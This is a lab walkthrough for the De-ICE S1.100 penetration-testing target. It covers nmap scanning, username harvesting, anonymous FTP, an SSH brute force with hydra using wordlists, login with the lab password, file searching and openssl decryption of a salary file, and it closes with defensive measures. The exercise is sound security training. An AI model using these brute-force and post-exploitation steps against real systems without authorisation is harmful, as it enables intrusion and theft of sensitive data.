# De-ICE S1.100 Penetration Testing Lab Guide

## Scenario
You've been hired to perform a penetration test on De-ICE Corporation's web server. The CEO believes the system is secure since they run regular Nessus scans. Your job is to prove that automated scanning isn't enough.

## Learning Objectives
- Service enumeration and reconnaissance
- Username harvesting from web applications
- SSH brute force attacks
- File system exploration via FTP
- Cryptographic analysis and decryption

## Lab Setup
```bash
./setup.sh
```

## Step-by-Step Walkthrough

### Phase 1: Reconnaissance

**From your Kali/attacker machine:**

1. **Network Discovery**
   ```bash
   # If attacking from same host:
   nmap -sC -sV -p 21,80,110,143,1025,2222,8025 localhost
   
   # If attacking from separate VM/machine:
   nmap -sC -sV -p 21,80,110,143,1025,2222,8025 [HOST_IP]
   ```

2. **Service Enumeration**
   Expected services:
   - Port 21: FTP (vsftpd)
   - Port 80: HTTP (Apache)
   - Port 110: POP3 (Dovecot)
   - Port 143: IMAP (Dovecot)  
   - Port 1025: SMTP (MailHog)
   - Port 2222: SSH (OpenSSH)
   - Port 8025: MailHog Web UI

### Phase 2: Information Gathering

3. **Web Application Analysis**
   ```bash
   # Browse to the target
   curl http://localhost      # if same host
   curl http://[HOST_IP]      # if remote host
   ```
   - Extract employee names and email addresses
   - Generate potential usernames:
     - aadams (Alice Adams)
     - bbanter (Bob Banter) 
     - ccoffee (Carol Coffee)
     - ddeeds (Dave Deeds)
     - eeikman (Eve Eikman)

4. **FTP Enumeration**
   ```bash
   ftp localhost              # if same host
   ftp [HOST_IP]              # if remote host
   # Try anonymous login
   # List files in directories  
   # Download any interesting files
   ```

### Phase 3: Exploitation

5. **SSH Brute Force**
   Create username and password lists:
   ```bash
   # Common username formats
   echo -e "aadams\nbbanter\nccoffee\nddeeds\neeikman\nroot\nadmin" > users.txt
   
   # Weak password patterns
   echo -e "nostaw\npassword\npassword123\n123456\nadmin\nroot" > passwords.txt
   
   # Use hydra or medusa for brute force
   hydra -L users.txt -P passwords.txt -s 2222 localhost ssh    # same host
   hydra -L users.txt -P passwords.txt -s 2222 [HOST_IP] ssh    # remote host
   ```

6. **SSH Access**
   ```bash
   ssh -p 2222 aadams@localhost     # same host
   ssh -p 2222 aadams@[HOST_IP]     # remote host
   # Password: nostaw
   ```

### Phase 4: Post-Exploitation

7. **System Exploration**
   ```bash
   # Check user privileges
   whoami
   id
   sudo -l
   
   # Explore file system
   ls -la /home
   find . -type f -name "*.txt" -o -name "*.csv" 2>/dev/null
   ```

8. **File Analysis**
   - Look for encrypted files from FTP
   - Attempt to decrypt using found credentials
   ```bash
   # If you found salary_dec2003.csv.enc
   openssl enc -aes-256-cbc -d -salt -in salary_dec2003.csv.enc -out salary.csv -k "HeadOfSecurity"
   ```

## Expected Findings

### Vulnerabilities Discovered:
1. **Weak SSH Credentials**: User 'aadams' has password 'nostaw'
2. **Information Disclosure**: Employee details exposed on website
3. **Unencrypted FTP**: Anonymous access to sensitive files
4. **Weak Encryption**: Salary data encrypted with guessable password

### Risk Assessment:
- **Critical**: Weak authentication allows system compromise
- **High**: Sensitive salary information accessible
- **Medium**: Service enumeration reveals attack surface

## Cleanup
```bash
docker-compose -f de-ice-s1100.yml down
```

## Additional Challenges

Try these advanced scenarios:
1. Can you crack other user passwords?
2. What other sensitive files can you discover?
3. Can you escalate to root privileges?
4. How would you maintain persistence?

## Defensive Measures

Discuss how to prevent these attacks:
- Strong password policies
- Multi-factor authentication
- Principle of least privilege
- Regular security assessments
- Proper file permissions and encryption